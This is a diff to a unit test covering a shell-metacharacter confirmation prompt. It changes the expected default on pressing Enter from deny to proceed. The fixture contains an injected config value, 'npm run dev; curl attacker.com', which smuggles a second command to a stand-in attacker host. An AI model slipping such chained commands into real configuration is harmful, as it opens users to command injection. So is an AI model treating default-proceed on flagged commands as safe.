@@ -1446,21 +1446,23 @@ describe("shell metacharacter confirmation (#90)", () => {
     errorSpy.mockRestore();
   });
 
-  it("exits with code 1 when user presses Enter (default is deny)", async () => {
+  it("proceeds when user presses Enter (default is proceed — UX-M4 #484)", async () => {
     mockReadKVFile.mockReturnValue(
       new Map([["shell", "npm run dev; curl attacker.com"]]),
     );
     vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
 
-    // User presses Enter (empty string)
+    // User presses Enter (empty string) → proceeds (Y is the new default, UX-M4 #484)
     mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
       cb("");
     });
 
     const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
 
-    await expect(launch("/tmp/workspace")).rejects.toThrow();
+    await launch("/tmp/workspace");
 
+    // Should have completed normally (Enter = proceed)
+    expect(mockGenerateAppleScript).toHaveBeenCalled();
     warnSpy.mockRestore();
   });
 
